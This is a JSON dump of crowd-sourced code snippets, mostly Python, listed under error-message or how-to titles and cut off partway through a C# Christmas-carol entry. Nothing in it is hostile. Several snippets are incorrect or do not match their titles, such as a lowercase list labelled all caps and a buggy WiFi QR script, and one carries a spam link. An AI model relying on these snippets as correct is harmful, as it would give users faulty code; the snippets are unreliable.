[
  {
    "id": 1,
    "keyword": null,
    "link": "                                                ",
    "title": " # Python program to check if the input number is odd or even.                                                ",
    "description": "# Python program to check if the input number is odd or even. # A number is even if division by 2 gives a remainder of 0. # If the remainder is 1, it is an odd number.  num = int(input(\"Enter a number: \")) if (num % 2) == 0:    print(\"{0} is Even\".format(num)) else:    print(\"{0} is Odd\".format(num))\r\n\r\n                    \r\n                    ",
    "reg_date": "2021-11-01T15:05:41.000Z"
  },
  {
    "id": 2,
    "keyword": null,
    "link": null,
    "title": " $ sudo pip install pdml2flow-frame-inter-arrival-time",
    "description": "$ sudo pip install pdml2flow-frame-inter-arrival-time \n",
    "reg_date": "2021-10-12T11:27:25.000Z"
  },
  {
    "id": 3,
    "keyword": null,
    "link": null,
    "title": " 'Keras requires TensorFlow 2.2 or higher. ' ImportError: Keras requires TensorFlow 2.2 or higher. Install TensorFlow via `pip install tensorflow",
    "description": "pip3 install --upgrade tensorflow \n",
    "reg_date": "2021-10-12T11:27:25.000Z"
  },
  {
    "id": 4,
    "keyword": null,
    "link": null,
    "title": " 'Polygon' object has no property 'normed'",
    "description": "\"\"\"The same happens if you use 'density=True' as\"\"\" l = plt.hist(data,density = True, bins = 100) \n",
    "reg_date": "2021-10-12T11:27:25.000Z"
  },
  {
    "id": 5,
    "keyword": null,
    "link": null,
    "title": " 'flask' is not recognized as an internal or external command, operable program or batch file.",
    "description": "set PATH=C:\\Users\\YOUR_USER_NAME\\AppData\\Local\\Packages\\PythonSoftwareFoundation.Python.3.8_qbz5n2kfra8p0\\LocalCache\\local-packages\\Python38\\Scripts \n",
    "reg_date": "2021-10-12T11:27:25.000Z"
  },
  {
    "id": 6,
    "keyword": null,
    "link": null,
    "title": " 'int' object is not iterable during loop",
    "description": "list = ['a','b','c','d'] for i in range(len(list)): \t#Code it      pass\n",
    "reg_date": "2021-10-12T11:27:25.000Z"
  },
  {
    "id": 7,
    "keyword": null,
    "link": null,
    "title": " 'list' object has no attribute 'len'   python",
    "description": "A = [1,2,3,4] #incorrect way to get length - python A.len() #correct way len(A) \n",
    "reg_date": "2021-10-12T11:27:26.000Z"
  },
  {
    "id": 8,
    "keyword": null,
    "link": null,
    "title": " 'numpy.ndarray' object has no attribute 'append'",
    "description": "#instead of name_array.append(number) use numpy.append(name_array, number) #insted of: a = [1,2,3,4] a.append(5) #use: a = [1,2,3,4] numpy.append(a, 5)\n",
    "reg_date": "2021-10-12T11:27:26.000Z"
  },
  {
    "id": 9,
    "keyword": null,
    "link": null,
    "title": " 'pip' is not recognized as an internal or external command, operable program or batch file.",
    "description": "npm install -g @angular/cli \npy -m pip install [packagename]\nimport os import sys pipPath = f'{os.path.dirname(sys.executable)}\\\\Scripts' os.system(f'setx PATH \"%PATH%;{pipPath}\"')\npython -m pip install [packagename]\nsetx PATH \"%PATH%;C:\\Python34\\Scripts\" \nC:\\Users\\YOUR_USERNAME\\AppData\\Local\\Programs\\Python\\Python36\\Scripts\n",
    "reg_date": "2021-10-12T11:27:26.000Z"
  },
  {
    "id": 10,
    "keyword": null,
    "link": null,
    "title": " 'utf-8' codec can't decode byte 0x85 in position 715: invalid start byte",
    "description": "import pandas as pd data = pd.read_csv(filename, encoding= 'unicode_escape')\n",
    "reg_date": "2021-10-12T11:27:26.000Z"
  },
  {
    "id": 11,
    "keyword": null,
    "link": null,
    "title": " , in <genexpr> if not all (key in json for key in transaction keys): TypeError: argument of type 'NoneType' is not iterable",
    "description": "try: js = json.loads(str(data)) except: js = None  print(\"TRACE: js=\", js) if 'status' not in js or js['status'] != 'OK':\n",
    "reg_date": "2021-10-12T11:27:26.000Z"
  },
  {
    "id": 12,
    "keyword": null,
    "link": null,
    "title": " >>> import numpy Illegal instruction (core dumped)",
    "description": "Confirmed. Just for the record, this solution (overriding environment variable) allows numpy to be loaded despite the wrong CPU detection:  >>> import os >>> os.environ[\"OPENBLAS_CORETYPE\"] = \"nehalem\" >>> import numpy as np >>>\n",
    "reg_date": "2021-10-12T11:27:26.000Z"
  },
  {
    "id": 13,
    "keyword": null,
    "link": null,
    "title": " @classmethod vs @staticmethod vs \"plain\" methods",
    "description": "# @classmethod vs @staticmethod vs \"plain\" methods # What's the difference?  class MyClass:     def method(self):         \"\"\"         Instance methods need a class instance and         can access the instance through `self`.         \"\"\"         return 'instance method called', self      @classmethod     def classmethod(cls):         \"\"\"         Class methods don't need a class instance.         They can't access the instance (self) but         they have access to the class itself via `cls`.         \"\"\"         return 'class method called', cls      @staticmethod     def staticmethod():         \"\"\"         Static methods don't have access to `cls` or `self`.         They work like regular functions but belong to         the class's namespace.         \"\"\"         return 'static method called'  # All methods types can be # called on a class instance: >>> obj = MyClass() >>> obj.method() ('instance method called', <MyClass instance at 0x1019381b8>) >>> obj.classmethod() ('class method called', <class MyClass at 0x101a2f4c8>) >>> obj.staticmethod() 'static method called'  # Calling instance methods fails # if we only have the class object: >>> MyClass.classmethod() ('class method called', <class MyClass at 0x101a2f4c8>) >>> MyClass.staticmethod() 'static method called' >>> MyClass.method() TypeError:      \"unbound method method() must be called with MyClass \"     \"instance as first argument (got nothing instead)\"\n",
    "reg_date": "2021-10-12T11:27:26.000Z"
  },
  {
    "id": 14,
    "keyword": null,
    "link": null,
    "title": " .ravel python",
    "description": "import numpy as np   x = np.array([[1, 3, 5], [11, 35, 56]])   y = np.ravel(x, order='F')   z = np.ravel(x, order='C')   p = np.ravel(x, order='A')   q = np.ravel(x, order='K')   y   z   p   q   #Output array([ 1, 11,  3, 35,  5, 56]) array([ 1,  3,  5, 11, 35, 56]) array([ 1,  3,  5, 11, 35, 56]) array([ 1,  3,  5, 11, 35, 56]) \n>>> x = np.array([[1, 2, 3], [4, 5, 6]]) >>> np.ravel(x) array([1, 2, 3, 4, 5, 6]) \n",
    "reg_date": "2021-10-12T11:27:26.000Z"
  },
  {
    "id": 15,
    "keyword": null,
    "link": null,
    "title": " 123ink",
    "description": "123ink\n",
    "reg_date": "2021-10-12T11:27:27.000Z"
  },
  {
    "id": 16,
    "keyword": null,
    "link": null,
    "title": " 1 day ago python datetime",
    "description": "date_N_days_ago = datetime.now() - timedelta(days=N)\n",
    "reg_date": "2021-10-12T11:27:27.000Z"
  },
  {
    "id": 17,
    "keyword": null,
    "link": null,
    "title": " 2 list difference python",
    "description": "list1 = [1, 2, 4] list2 = [4, 5, 6]  set_difference = set(list1) - set(list2) list_difference = list(set_difference)  print(list_difference)  #result [1,2]\n",
    "reg_date": "2021-10-12T11:27:27.000Z"
  },
  {
    "id": 18,
    "keyword": null,
    "link": null,
    "title": " 2d list comprehension python",
    "description": "[[float(c) for c in row] for row in data]\n",
    "reg_date": "2021-10-12T11:27:27.000Z"
  },
  {
    "id": 19,
    "keyword": null,
    "link": null,
    "title": " 2set",
    "description": "if you can play it slowly...\n",
    "reg_date": "2021-10-12T11:27:27.000Z"
  },
  {
    "id": 20,
    "keyword": null,
    "link": null,
    "title": " 3d array in numpy",
    "description": ">>> a = np.zeros((2, 3, 4)) >>> a array([[[ 0.,  0.,  0.,  0.],         [ 0.,  0.,  0.,  0.],         [ 0.,  0.,  0.,  0.]],         [[ 0.,  0.,  0.,  0.],         [ 0.,  0.,  0.,  0.],         [ 0.,  0.,  0.,  0.]]]) \n",
    "reg_date": "2021-10-12T11:27:27.000Z"
  },
  {
    "id": 21,
    "keyword": null,
    "link": null,
    "title": " 3d pie chart in python",
    "description": "import matplotlib.pyplot as plt labels = ['Python', 'C++', 'Ruby', 'Java'] sizes = [215, 130, 245, 210] # Plot plt.pie(sizes, labels=labels,          autopct='%1.1f%%', shadow=True, startangle=140) plt.axis('equal') plt.show()\n",
    "reg_date": "2021-10-12T11:27:27.000Z"
  },
  {
    "id": 22,
    "keyword": null,
    "link": null,
    "title": " 3d plots in python",
    "description": "#import pyplot and Axes3D import matplotlib.pyplot as plt from mpl_toolkits.mplot3d import Axes3D  #plotting a scatter for example fig = plt.figure() ax = fig.add_subplot(111,projection = \"3d\") ax.scatter(xs = data[\"x\"], ys = data[\"y\"], zs = data[\"z\"]) fig\nfrom mpl_toolkits.mplot3d import Axes3D import matplotlib.pyplot as plt    fig = plt.figure() ax = fig.add_subplot(111, projection='3d')  x =[1,2,3,4,5,6,7,8,9,10] y =[5,6,2,3,13,4,1,2,4,8] z =[2,3,3,3,5,7,9,11,9,10]    ax.scatter(x, y, z, c='r', marker='o')  ax.set_xlabel('X Label') ax.set_ylabel('Y Label') ax.set_zlabel('Z Label')  plt.show()\nfig = plt.figure() ax = plt.axes(projection='3d') \nfrom mpl_toolkits import mplot3d \n",
    "reg_date": "2021-10-12T11:27:27.000Z"
  },
  {
    "id": 23,
    "keyword": null,
    "link": null,
    "title": " 8 ball responses list python",
    "description": "responses = [\"As I see it, yes.\", \"Ask again later.\", \"Better not tell you now.\", \"Cannot predict now.\", \"Concentrate and ask again.\",              \"Don&rsquo;t count on it.\", \"It is certain.\", \"It is decidedly so.\", \"Most likely.\", \"My reply is no.\", \"My sources say no.\",              \"Outlook not so good.\", \"Outlook good.\", \"Reply hazy, try again.\", \"Signs point to yes.\", \"Very doubtful.\", \"Without a doubt.\",              \"Yes.\", \"Yes &ndash; definitely.\", \"You may rely on it.\"]\n",
    "reg_date": "2021-10-12T11:27:27.000Z"
  },
  {
    "id": 24,
    "keyword": null,
    "link": null,
    "title": " A0 = dict(zip(('a','b','c','d','e'),(1,2,3,4,5)))",
    "description": "A0 = dict(zip(('a','b','c','d','e'),(1,2,3,4,5))) Print(A0)\n",
    "reg_date": "2021-10-12T11:27:28.000Z"
  },
  {
    "id": 25,
    "keyword": null,
    "link": null,
    "title": " ANSHUL",
    "description": "print(\"He's a fuckin geenius.\")\n",
    "reg_date": "2021-10-12T11:27:28.000Z"
  },
  {
    "id": 26,
    "keyword": null,
    "link": null,
    "title": " A value is trying to be set on a copy of a slice from a DataFrame.",
    "description": "# Error: # SettingWithCopyWarning: A value is trying to be set on a copy of a # slice from a DataFrame  # As explained in the Source, this warning is usually safe to ignore. You # can disable it by running the following:  import pandas as pd pd.options.mode.chained_assignment = None  # default='warn'\nimport pandas as pd pd.options.mode.chained_assignment = None  # default='warn' \ndf[df['A'] > 2]['B'] = new_val  # new_val not set in df # rewrite it as below df.loc[df['A'] > 2, 'B'] = new_val \n>>> df = pd.DataFrame(data=data, index=index)  >>> df.loc[mask, \"z\"] = 0 >>> df     x   y   z a   1   1   0 b   2   3  98 c   4   9   0 d   8  27   0 e  16  81  64 \n",
    "reg_date": "2021-10-12T11:27:28.000Z"
  },
  {
    "id": 27,
    "keyword": null,
    "link": null,
    "title": " Addition/subtraction of integers and integer-arrays with DatetimeArray is no longer supported",
    "description": "end_date = (date+timedelta(days=4)).strftime(\"%Y-%m-%d\") # ... date = date+timedelta(days=3)\n",
    "reg_date": "2021-10-12T11:27:28.000Z"
  },
  {
    "id": 28,
    "keyword": null,
    "link": null,
    "title": " Advanced bmi calculator using python",
    "description": "User_height = float(input(\"Enter your height in cm: \")) User_weight = float(input(\"Enter your weight in kg: \")) BMI = User_weight / (User_height/100)**2 print(f\"You BMI is {BMI}\") if BMI <= 18.4:     print(\"You are underweight.\") elif BMI <= 24.9:     print(\"You are healthy.\") elif BMI <= 29.9:     print(\"You are over weight.\") elif BMI <= 34.9:     print(\"You are severely over weight.\") elif BMI <= 39.9:     print(\"You are obese.\") else:     print(\"You are severely obese.\")     \nHight = float(input(\"What is Your Hight in m:- \")) weight = float(input(\"What is your weight in kg:- \")) calculator = weight/Hight ** 2 print(calculator)\n",
    "reg_date": "2021-10-12T11:27:28.000Z"
  },
  {
    "id": 29,
    "keyword": null,
    "link": null,
    "title": " Aggregate the elements of each partition, and then the results for all the partitions",
    "description": "#Aggregate the elements of each partition, and then the results for all the partitions  seqOp = (lambda x, y: (x[0] + y, x[1] + 1)) combOp = (lambda x, y: (x[0] + y[0], x[1], y[1])) sc.parallelize([1, 2, 3, 4]).aggregate((0, 0), seqOp, combOp) # (10, 4) sc.parallelize([]).aggregate((0, 0), seqOp, combOp) # (0, 0)\n",
    "reg_date": "2021-10-12T11:27:28.000Z"
  },
  {
    "id": 30,
    "keyword": null,
    "link": null,
    "title": " All caps alphabet as list",
    "description": "['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']\n",
    "reg_date": "2021-10-12T11:27:28.000Z"
  },
  {
    "id": 31,
    "keyword": null,
    "link": null,
    "title": " AlphaTauri",
    "description": "print(\"Torro Rosso\")\n",
    "reg_date": "2021-10-12T11:27:28.000Z"
  },
  {
    "id": 32,
    "keyword": null,
    "link": null,
    "title": " Alphabet dictionary Python",
    "description": "alphabet = {         'a' : '1',          'b' : '2',          'c' : '3',          'd' : '4',          'e' : '5',          'f' : '6',          'g' : '7',          'h' : '8',          'i' : '9',          'j' : '10',          'k' : '11',          'l' : '12',          'm' : '13',          'n' : '14',          'o' : '15',          'p' : '16',          'q' : '17',          'r' : '18',          's' : '19',          't' : '20',          'u' : '21',          'v' : '22',          'w' : '23',          'x' : '24',          'y' : '25',          'z' : '26'     }\n    alphabet = {         'a' : 0,          'b' : 0,          'c' : 0,          'd' : 0,          'e' : 0,          'f' : 0,          'g' : 0,          'h' : 0,          'i' : 0,          'j' : 0,          'k' : 0,          'l' : 0,          'm' : 0,          'n' : 0,          'o' : 0,          'p' : 0,          'q' : 0,          'r' : 0,          's' : 0,          't' : 0,          'u' : 0,          'v' : 0,          'w' : 0,          'x' : 0,          'y' : 0,          'z' : 0     }\n    alphabet = {         'a' : 0,          'b' : 0,          'c' : 0,          'd' : 0,          'e' : 0,          'f' : 0,          'g' : 0,          'h' : 0,          'i' : 0,          'j' : 0,          'k' : 0,          'l' : 0,          'm' : 0,          'n' : 0,          'o' : 0,          'p' : 0,          'q' : 0,          'r' : 0,          's' : 0,          't' : 0,          'u' : 0,          'v' : 0,          'w' : 0,          'x' : 0,          'y' : 0,          'z' : 0,         '1' : 0,          '2' : 0,          '3' : 0,          '4' : 0,          '5' : 0,          '6' : 0,          '7' : 0,          '8' : 0,          '9' : 0,          '0' : 0     }\nalphabet {1:'a', 2:'b', 3:'c', 4:'d', 5:'e', 6:'f', 7:'g', 8:'h', 9:'i', 10:'j', 11:'k', 12:'l', 13:'m', 14:'n', 15:'o', 16:'p', 17:'q', 18:'r', 19:'s', 20:'t', 21:'u', 22:'v', 23:'w', 24:'x', 25:'y', 26:'z'} \n",
    "reg_date": "2021-10-12T11:27:28.000Z"
  },
  {
    "id": 33,
    "keyword": null,
    "link": null,
    "title": " Ascending discending",
    "description": ">>> sorted(student_tuples, key=itemgetter(2), reverse=True) [('john', 'A', 15), ('jane', 'B', 12), ('dave', 'B', 10)] \n",
    "reg_date": "2021-10-12T11:27:29.000Z"
  },
  {
    "id": 34,
    "keyword": null,
    "link": null,
    "title": " AttributeError: 'Timedelta' object has no attribute 'minutes'",
    "description": "df['minutes'] = df['time'].dt.total_seconds()/60\n# Use either import datetime datetime.datetime.timedelta() # or from datetime import datetime datetime.timedelta() # But do not use (as you currently are): from datetime import datetime datetime.datetime.timedelta()\n",
    "reg_date": "2021-10-12T11:27:29.000Z"
  },
  {
    "id": 35,
    "keyword": null,
    "link": null,
    "title": " AttributeError: 'dict' object has no attribute 'iteritems'",
    "description": "As you are in python3 , use dict.items() instead of dict.iteritems() iteritems() was removed in python3, so you can't use this method  anymore. Take a look at Python 3.0 Wiki Built-in Changes section,  where it is stated:  Removed dict.iteritems(), dict.iterkeys(), and dict.itervalues().  Instead: use dict.items(), dict.keys(), dict.values() respectively. \n",
    "reg_date": "2021-10-12T11:27:29.000Z"
  },
  {
    "id": 36,
    "keyword": null,
    "link": null,
    "title": " AttributeError: module 'django.contrib.auth.views' has no attribute 'login'",
    "description": "from django.contrib.auth import views as auth_views  urlpatterns = [    url( r'^login/$',auth_views.LoginView.as_view(template_name=\"useraccounts/login.html\"), name=\"login\"), ]\n",
    "reg_date": "2021-10-12T11:27:29.000Z"
  },
  {
    "id": 37,
    "keyword": null,
    "link": null,
    "title": " AttributeError: module 'keras.optimizers' has no attribute 'RMSprop'",
    "description": "# Instead of importing via from keras import optimizers,  # you should use from tensorflow.keras import optimizers.  from tensorflow.keras import optimizers\n",
    "reg_date": "2021-10-12T11:27:29.000Z"
  },
  {
    "id": 38,
    "keyword": null,
    "link": null,
    "title": " AttributeError: module 'librosa' has no attribute 'display' site:stackoverflow.com",
    "description": "# just import the display  import librosa.display plt.figure(figsize=(12, 4)) librosa.display.waveplot(data, sr=sampling_rate)\n",
    "reg_date": "2021-10-12T11:27:29.000Z"
  },
  {
    "id": 39,
    "keyword": null,
    "link": null,
    "title": " AttributeError: module 'os' has no attribute 'PathLike'",
    "description": "python should be 3.6 or greater\n",
    "reg_date": "2021-10-12T11:27:29.000Z"
  },
  {
    "id": 40,
    "keyword": null,
    "link": null,
    "title": " AttributeError: module 'tensorflow' has no attribute 'GraphDef'",
    "description": "tf.compat.v1.GraphDef()   # -> instead of tf.GraphDef() tf.compat.v2.io.gfile.GFile()   # -> instead of tf.gfile.GFile() \nEager execution is enabled by default in version 2.x  You can check that by using:  tf.executing_eagerly()\n",
    "reg_date": "2021-10-12T11:27:29.000Z"
  },
  {
    "id": 41,
    "keyword": null,
    "link": null,
    "title": " AttributeError: module 'tensorflow' has no attribute 'Session'",
    "description": "According to TF 1:1 Symbols Map, in TF 2.0 you should use tf.compat.v1.Session() instead of tf.Session()  https://docs.google.com/spreadsheets/d/1FLFJLzg7WNP6JHODX5q8BDgptKafq_slHpnHVbJIteQ/edit#gid=0  To get TF 1.x like behaviour in TF 2.0 one can run  import tensorflow.compat.v1 as tf tf.disable_v2_behavior()\n sess = tf.compat.v1.Session()  print(sess.run(hello))\nimport tensorflow as tf  tf.compat.v1.disable_eager_execution()  hello = tf.constant('Hello, TensorFlow!')  sess = tf.compat.v1.Session()  print(sess.run(hello))\nsess=tf.compat.v1.InteractiveSession()\n",
    "reg_date": "2021-10-12T11:27:29.000Z"
  },
  {
    "id": 42,
    "keyword": null,
    "link": null,
    "title": " AttributeError: module 'tensorflow' has no attribute 'Session' site:stackoverflow.com",
    "description": "According to TF 1:1 Symbols Map, in TF 2.0 you should use tf.compat.v1.Session() instead of tf.Session()  https://docs.google.com/spreadsheets/d/1FLFJLzg7WNP6JHODX5q8BDgptKafq_slHpnHVbJIteQ/edit#gid=0  To get TF 1.x like behaviour in TF 2.0 one can run  import tensorflow.compat.v1 as tf tf.disable_v2_behavior()\n sess = tf.compat.v1.Session()  print(sess.run(hello))\nimport tensorflow as tf  tf.compat.v1.disable_eager_execution()  hello = tf.constant('Hello, TensorFlow!')  sess = tf.compat.v1.Session()  print(sess.run(hello))\n",
    "reg_date": "2021-10-12T11:27:29.000Z"
  },
  {
    "id": 43,
    "keyword": null,
    "link": null,
    "title": " AttributeError: module 'tensorflow' has no attribute 'placeholder'",
    "description": "#replace import tensorflow as tf by following import tensorflow.compat.v1 as tf tf.disable_v2_behavior()\nimport tensorflow.compat.v1 as tf tf.disable_v2_behavior()\n",
    "reg_date": "2021-10-12T11:27:30.000Z"
  },
  {
    "id": 44,
    "keyword": null,
    "link": null,
    "title": " AttributeError: module 'tensorflow' has no attribute 'random normal'",
    "description": "It was moved to tf.random.normal (along with all the other  tf.random_* functions)\n",
    "reg_date": "2021-10-12T11:27:30.000Z"
  },
  {
    "id": 45,
    "keyword": null,
    "link": null,
    "title": " AttributeError: module 'tensorflow. api.v2.train' has no attribute 'GradientDescentOptimizer' site:stackoverflow.com",
    "description": "use tf.optimizer.SGD() for tensorflow2.0\nimport tensorflow.compat.v1 as tf tf.disable_v2_behavior()\n",
    "reg_date": "2021-10-12T11:27:30.000Z"
  },
  {
    "id": 46,
    "keyword": null,
    "link": null,
    "title": " AttributeError: module 'urllib' has no attribute 'URLopener'",
    "description": "import urllib.request  with urllib.request.urlopen(\"http://www.python.org\") as url:     s = url.read()     # I'm guessing this would output the html source code ?     print(s)\n",
    "reg_date": "2021-10-12T11:27:30.000Z"
  },
  {
    "id": 47,
    "keyword": null,
    "link": null,
    "title": " AttributeError: type object 'Callable' has no attribute ' abc registry'",
    "description": "I solved this problem with  pip uninstall typing\npip uninstall typing \n",
    "reg_date": "2021-10-12T11:27:30.000Z"
  },
  {
    "id": 48,
    "keyword": null,
    "link": null,
    "title": " Bellman ford Python",
    "description": "class Graph:        def __init__(self, vertices):          self.M = vertices   # Total number of vertices in the graph          self.graph = []     # Array of edges        # Add edges      def add_edge(self, a, b, c):          self.graph.append([a, b, c])        # Print the solution      def print_solution(self, distance):          print(\"Vertex Distance from Source\")          for k in range(self.M):              print(\"{0}\\t\\t{1}\".format(k, distance[k]))        def bellman_ford(self, src):            distance = [float(\"Inf\")] * self.M          distance[src] = 0            for _ in range(self.M - 1):              for a, b, c in self.graph:                  if distance[a] != float(\"Inf\") and distance[a] + c < distance[b]:                      distance[b] = distance[a] + c            for a, b, c in self.graph:              if distance[a] != float(\"Inf\") and distance[a] + c < distance[b]:                  print(\"Graph contains negative weight cycle\")                  return            self.print_solution(distance)    g = Graph(5)  g.add_edge(0, 1, 2)  g.add_edge(0, 2, 4)  g.add_edge(1, 3, 2)  g.add_edge(2, 4, 3)  g.add_edge(2, 3, 4)  g.add_edge(4, 3, -5)    g.bellman_ford(0)  \n",
    "reg_date": "2021-10-12T11:27:30.000Z"
  },
  {
    "id": 49,
    "keyword": null,
    "link": null,
    "title": " CMake Error at 3rdparty/GLFW/CMakeLists.txt:236 (message): The RandR headers were not found",
    "description": " sudo apt-get install xorg-dev libglu1-mesa-dev\n",
    "reg_date": "2021-10-12T11:27:30.000Z"
  },
  {
    "id": 50,
    "keyword": null,
    "link": null,
    "title": " Can't find model 'en core web sm'. It doesn't seem to be a shortcut link, a Python package or a valid path to a data directory.",
    "description": "python -m spacy download en \nimport en_core_web_sm nlp = en_core_web_sm.load()\npip3 install https://github.com/explosion/spacy-models/releases/download/en_core_web_sm-2.2.0/en_core_web_sm-2.2.0.tar.gz \n",
    "reg_date": "2021-10-12T11:27:30.000Z"
  },
  {
    "id": 51,
    "keyword": null,
    "link": null,
    "title": " Can't find model 'en core web sm'",
    "description": "python -m spacy download en_core_web_lg python -m spacy download en_core_web_sm \npython -m spacy download en \npython3 -m spacy download en_core_web_sm pip3 install https://github.com/explosion/spacy-models/releases/download/en_core_web_sm-2.2.0/en_core_web_sm-2.2.0.tar.gz \n",
    "reg_date": "2021-10-12T11:27:30.000Z"
  },
  {
    "id": 52,
    "keyword": null,
    "link": null,
    "title": " Can only use .dt accessor with datetimelike values",
    "description": "df['Date'] = pd.to_datetime(df['Date'], errors='coerce') \n",
    "reg_date": "2021-10-12T11:27:31.000Z"
  },
  {
    "id": 53,
    "keyword": null,
    "link": null,
    "title": " Colorcodes Discord.py",
    "description": "class colors:     default = 0     teal = 0x1abc9c     dark_teal = 0x11806a     green = 0x2ecc71     dark_green = 0x1f8b4c     blue = 0x3498db     dark_blue = 0x206694     purple = 0x9b59b6     dark_purple = 0x71368a     magenta = 0xe91e63     dark_magenta = 0xad1457     gold = 0xf1c40f     dark_gold = 0xc27c0e     orange = 0xe67e22     dark_orange = 0xa84300     red = 0xe74c3c     dark_red = 0x992d22     lighter_grey = 0x95a5a6     dark_grey = 0x607d8b     light_grey = 0x979c9f     darker_grey = 0x546e7a     blurple = 0x7289da     greyple = 0x99aab5 \n",
    "reg_date": "2021-10-12T11:27:31.000Z"
  },
  {
    "id": 54,
    "keyword": null,
    "link": null,
    "title": " Convert Excel to CSV using Python",
    "description": "import pandas as pd data_xls = pd.read_excel('excelfile.xlsx', 'Sheet2', dtype=str, index_col=None) data_xls.to_csv('csvfile.csv', encoding='utf-8', index=False) \nimport pandas as pd import os import glob   source=\"D:\\\\source\\\\\" dest='D:\\\\dest\\\\' os.chdir(source)  for file in glob.glob(\"*.xls\"):        df = pd.read_excel(file)        df.to_csv(dest+file+'.csv', index=False)        os.remove(file) for file in glob.glob(\"*.xlsx\"):        df = pd.read_excel(file)        df.to_csv(dest+file+'.csv', index=False)        os.remove(file)\n",
    "reg_date": "2021-10-12T11:27:31.000Z"
  },
  {
    "id": 55,
    "keyword": null,
    "link": null,
    "title": " Convert a Video in python to individual Frames",
    "description": "import cv2 vidcap = cv2.VideoCapture('big_buck_bunny_720p_5mb.mp4') success,image = vidcap.read() count = 0 while success:   cv2.imwrite(\"frame%d.jpg\" % count, image)     # save frame as JPEG file         success,image = vidcap.read()   print('Read a new frame: ', success)   count += 1 \n",
    "reg_date": "2021-10-12T11:27:31.000Z"
  },
  {
    "id": 56,
    "keyword": null,
    "link": null,
    "title": " Convert the number from International system to Indian system using python",
    "description": "please subscribe my channel - https://bit.ly/2Me2CfB  import decimal  def currencyInIndiaFormat(n):   d = decimal.Decimal(str(n))   if d.as_tuple().exponent < -2:     s = str(n)   else:     s = '{0:.2f}'.format(n)   l = len(s)   i = l-1;   res = ''   flag = 0   k = 0   while i>=0:     if flag==0:       res = res + s[i]       if s[i]=='.':         flag = 1     elif flag==1:       k = k + 1       res = res + s[i]       if k==3 and i-1>=0:         res = res + ','         flag = 2         k = 0     else:       k = k + 1       res = res + s[i]       if k==2 and i-1>=0:         res = res + ','         flag = 2         k = 0     i = i - 1\n",
    "reg_date": "2021-10-12T11:27:31.000Z"
  },
  {
    "id": 57,
    "keyword": null,
    "link": null,
    "title": " Could not find a version that satisfies the requirement psycopg2>=2.8 (from pgcli) (from versions: 2.7.5, 2.7.6, 2.7.6.1, 2.7.7)",
    "description": "pip install pgcli==2.1.1 --only-binary psycopg2 \n",
    "reg_date": "2021-10-12T11:27:31.000Z"
  },
  {
    "id": 58,
    "keyword": null,
    "link": null,
    "title": " Count lower case characters in a string",
    "description": "def n_lower_chars(string):     return sum([int(c.islower()) for c in string])\n",
    "reg_date": "2021-10-12T11:27:31.000Z"
  },
  {
    "id": 59,
    "keyword": null,
    "link": null,
    "title": " Counting Sort Python",
    "description": "# python program for counting sort  def countingSort(arr):     size = len(arr)     output = [0] * size      # count array initialization     count = [0] * 10      # storing the count of each element      for m in range(0, size):         count[arr[m]] += 1      # storing the cumulative count     for m in range(1, 10):         count[m] += count[m - 1]      # place the elements in output array after finding the index of each element of original array in count array     m = size - 1     while m >= 0:         output[count[arr[m]] - 1] = arr[m]         count[arr[m]] -= 1         m -= 1      for m in range(0, size):         arr[m] = output[m]  data = [3,5,1,6,7,8,3] countingSort(data) print(\"Sorted Array: \") print(data) \n",
    "reg_date": "2021-10-12T11:27:31.000Z"
  },
  {
    "id": 60,
    "keyword": null,
    "link": null,
    "title": " Create Wi-Fi QR code generator using Python",
    "description": "import os try:     import pyqrcode     import cv2 except Exception:     os.system(\"pip install pyqrcode\")     os.system(\"pip install opencv-python\")  ssid = input(\"\\nEnter WiFi SSID: \") authtypes = [\"WEP\", \"WPA\", 'nopass', 'nopass'] authnums = [\"1\", \"2\", \"3\", \"\", \"\"] print(\"\\nEnter\\n1)\\tWEP\") print(\"2)\\tWPA/WPA2\") print(\"3)\\tNone\") type = authtypes[authnums.index(input())] password = None  imagename = \"WIFI QR\" if type!=None:     password = input(\"\\nEnter Wifi password: \")  hidtemp = input(\"\\nIs wifi hidden? enter 1 if yes \") if hidtemp==1:     hidden = True else:     hidden=False  wifidata = f'WIFI:T:{type};S:{ssid};P:{password};H:{hidden};;' datysvd = pyqrcode.create(wifidata)  datysvd.png(imagename, scale = 10) image = cv2.imread(imagename) window_name = 'qrcode' cv2.imshow(window_name, image) cv2.waitKey(0) cv2.destroyAllWindows() os.remove(imagename)\n",
    "reg_date": "2021-10-12T11:27:31.000Z"
  },
  {
    "id": 61,
    "keyword": null,
    "link": null,
    "title": " DROP COLUMNS PADAS",
    "description": ">>> df.drop(columns=['B', 'C'])    A   D 0  0   3 1  4   7 2  8  11 \n",
    "reg_date": "2021-10-12T11:27:32.000Z"
  },
  {
    "id": 62,
    "keyword": null,
    "link": null,
    "title": " Date difference in minutes in Python",
    "description": "minutes_diff = (datetime_end - datetime_start).total_seconds() / 60.0 \n",
    "reg_date": "2021-10-12T11:27:32.000Z"
  },
  {
    "id": 63,
    "keyword": null,
    "link": null,
    "title": " December global holidays",
    "description": "its almost over...\nMaybe 2020 was kinda weird, but I hope everyone reading this has a wonderful December. Happy Holidays!!! :D\nint dayOfChristmas = 1;          if(dayOfChristmas == 1)         {         Console.WriteLine(\"On the first day of Christmas my true love sent to me: A Partridge in a Pear Tree\");         dayOfChristmas++;         }          if(dayOfChristmas == 2)         {         Console.WriteLine(\"On the second day of Christmas my true love sent to me: 2 Turtle Doves and a Partridge in a Pear Tree\");         dayOfChristmas++;         }          if(dayOfChristmas == 3)         {         Console.WriteLine(\"On the third day of Christmas my true love sent to me: 3 French Hens 2 Turtle Doves and a Partridge in a Pear Tree\");         dayOfChristmas++;         }          if(dayOfChristmas == 4)         {         Console.WriteLine(\"On the fourth day of Christmas my true love sent to me:4 Calling Birds 3 French Hens 2 Turtle Doves and a Partridge in a Pear Tree\");         dayOfChristmas++;         }          if(dayOfChristmas == 5)         {         Console.WriteLine(\"On the fifth day of Christmas my true love sent to me: 5 Golden Rings 4 Calling Birds 3 French Hens 2 Turtle Doves and a Partridge in a Pear Tree\");         dayOfChristmas++;         }          if(dayOfChristmas == 6)         {         Console.WriteLine(\"On the sixth day of Christmasmy true love sent to me: 6 Geese a Laying 5 Golden Rings 4 Calling Birds 3 French Hens 2 Turtle Doves and a Partridge in a Pear Tree\");         dayOfChristmas++;         }          if(dayOfChristmas == 7)         {         Console.WriteLine(\"On the seventh day of Christmas my true love sent to me: 7 Swans a Swimming 6 Geese a Laying 5 Golden Rings 4 Calling Birds 